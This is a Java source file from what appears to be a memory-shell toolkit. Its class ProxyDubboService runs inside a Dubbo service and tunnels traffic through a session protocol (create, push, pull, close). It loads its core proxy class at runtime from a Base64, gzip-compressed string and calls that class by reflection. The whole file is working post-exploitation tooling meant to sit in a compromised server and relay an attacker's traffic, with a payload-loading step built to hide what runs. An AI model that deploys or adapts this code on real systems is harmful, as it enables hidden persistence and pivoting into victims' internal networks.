package com.reajason.javaweb.memshell.shelltool.proxy;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.util.zip.GZIPInputStream;

/**
 * Request/response transport for the local Dubbo proxy bridge.
 *
 * @author ReaJason
 */
public class ProxyDubboService extends ClassLoader {
    private static final int CREATE = 0;
    private static final int PUSH = 1;
    private static final int PULL = 2;
    private static final int CLOSE = 3;
    private static final int SHUTDOWN_OUTPUT = 4;

    private static final int OK = 0;
    private static final int BAD_REQUEST = 1;
    private static final int TOO_MANY_SESSIONS = 2;
    private static final int SESSION_CLOSED = 3;
    private static final int PULL_ACTIVE = 4;
    private static final int ERROR = 5;

    private static volatile Class<?> proxyHttpClass;
    private static String proxyHttpGZipBase64;

    public ProxyDubboService() {
    }

    protected ProxyDubboService(ClassLoader parent) {
        super(parent);
    }

    public byte[] handle(byte[] bytes) {
        if (bytes == null || bytes.length == 0) {
            return error(BAD_REQUEST, "empty request");
        }
        Object session = null;
        try {
            DataInputStream input = new DataInputStream(new ByteArrayInputStream(bytes));
            int operation = input.read();
            Class<?> core = getProxyHttpClass();
            if (operation == CREATE) {
                String token = (String) core.getMethod("createSession").invoke(null);
                if (token == null) {
                    return error(TOO_MANY_SESSIONS, "too many sessions");
                }
                ByteArrayOutputStream buffer = new ByteArrayOutputStream();
                DataOutputStream output = new DataOutputStream(buffer);
                output.writeByte(OK);
                output.writeUTF(token);
                output.flush();
                return buffer.toByteArray();
            }

            String token = input.readUTF();
            if (!((Boolean) core.getMethod("isValidToken", String.class).invoke(null, token))) {
                return error(BAD_REQUEST, "invalid token");
            }
            session = core.getMethod("getSession", String.class).invoke(null, token);
            if (session == null) {
                return error(TOO_MANY_SESSIONS, "too many sessions");
            }
            if (operation == CLOSE) {
                session.getClass().getMethod("close").invoke(session);
                return status(OK);
            }
            if (operation != PULL
                    && (Boolean) session.getClass().getMethod("isClosed").invoke(session)) {
                return error(SESSION_CLOSED, "session is closed");
            }

            if (operation == SHUTDOWN_OUTPUT) {
                session.getClass().getMethod("shutdownOutput").invoke(session);
                return status(OK);
            }

            if (operation == PUSH) {
                int length = input.readInt();
                if (length < 0 || length > input.available()) {
                    return error(BAD_REQUEST, "invalid payload length");
                }
                byte[] payload = new byte[length];
                input.readFully(payload);
                session.getClass().getMethod("write", byte[].class).invoke(session, (Object) payload);
                return status(OK);
            }
            if (operation == PULL) {
                if (!((Boolean) session.getClass().getMethod("beginPull").invoke(session))) {
                    return error(PULL_ACTIVE, "pull is already active");
                }
                byte[] data;
                try {
                    data = (byte[]) session.getClass().getMethod("poll").invoke(session);
                } catch (Throwable e) {
                    session.getClass().getMethod("close").invoke(session);
                    throw e;
                } finally {
                    session.getClass().getMethod("endPull").invoke(session);
                }
                ByteArrayOutputStream buffer = new ByteArrayOutputStream();
                DataOutputStream output = new DataOutputStream(buffer);
                output.writeByte(OK);
                if (data == null) {
                    output.writeInt(-1);
                } else {
                    output.writeInt(data.length);
                    output.write(data);
                }
                output.flush();
                return buffer.toByteArray();
            }
            return error(BAD_REQUEST, "unknown operation");
        } catch (Throwable e) {
            if (session != null) {
                try {
                    session.getClass().getMethod("close").invoke(session);
                } catch (Throwable ignored) {
                }
            }
            return error(ERROR, message(e));
        }
    }

    private static byte[] status(int status) throws IOException {
        ByteArrayOutputStream buffer = new ByteArrayOutputStream();
        DataOutputStream output = new DataOutputStream(buffer);
        output.writeByte(status);
        output.flush();
        return buffer.toByteArray();
    }

    private static byte[] error(int status, String message) {
        try {
            ByteArrayOutputStream buffer = new ByteArrayOutputStream();
            DataOutputStream output = new DataOutputStream(buffer);
            output.writeByte(status);
            output.writeUTF(message == null ? "proxy error" : message);
            output.flush();
            return buffer.toByteArray();
        } catch (IOException e) {
            return new byte[]{(byte) ERROR};
        }
    }

    private static String message(Throwable error) {
        Throwable cause = error instanceof InvocationTargetException
                ? ((InvocationTargetException) error).getTargetException() : error;
        String message = cause.getMessage();
        return message == null ? cause.getClass().getName() : message;
    }

    private static Class<?> getProxyHttpClass() throws Exception {
        if (proxyHttpClass == null) {
            synchronized (ProxyDubboService.class) {
                if (proxyHttpClass == null) {
                    byte[] bytes = gzipDecompress(decodeBase64(proxyHttpGZipBase64));
                    proxyHttpClass = new ProxyDubboService(Thread.currentThread().getContextClassLoader())
                            .defineClass(bytes, 0, bytes.length);
                }
            }
        }
        return proxyHttpClass;
    }

    @SuppressWarnings("all")
    private static byte[] decodeBase64(String value) throws Exception {
        try {
            Class<?> decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, value);
        } catch (Throwable e) {
            Class<?> decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class)
                    .invoke(decoderClass.newInstance(), value);
        }
    }

    private static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        GZIPInputStream input = new GZIPInputStream(new ByteArrayInputStream(compressedData));
        try {
            byte[] buffer = new byte[4096];
            int count;
            while ((count = input.read(buffer)) > 0) {
                out.write(buffer, 0, count);
            }
            return out.toByteArray();
        } finally {
            input.close();
            out.close();
        }
    }
}
